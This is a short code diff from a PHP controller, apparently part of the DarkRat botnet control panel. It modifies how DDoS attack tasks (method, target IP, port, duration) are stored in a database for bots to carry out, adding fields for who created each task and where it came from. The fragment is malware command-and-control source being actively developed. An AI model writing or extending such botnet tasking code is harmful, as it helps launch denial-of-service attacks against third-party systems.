@@ -80,8 +80,8 @@ class ddosController
             if (!is_int(intval($_POST["targetport"]))) {
                 die("Port has to be a Number");
             }
-            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_tasks (method,targetip,maxtime,port,status) VALUES (?, ?, ?, ?, ?)");
-            $statement->execute(array($_POST["method"], $_POST["targetip"], $_POST["maxtime"], $_POST["targetport"], "active"));
+            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_tasks (method,targetip,maxtime,port,status,created_by,origin_from,max_executions) VALUES (?, ?, ?, ?, ?, ?, ? ,?)");
+            $statement->execute(array($_POST["method"], $_POST["targetip"], $_POST["maxtime"], $_POST["targetport"], "active",$_SESSION["darkrat_userid"],"panel",0));
         }
 
         if (!empty($_POST["changeTask"])) {
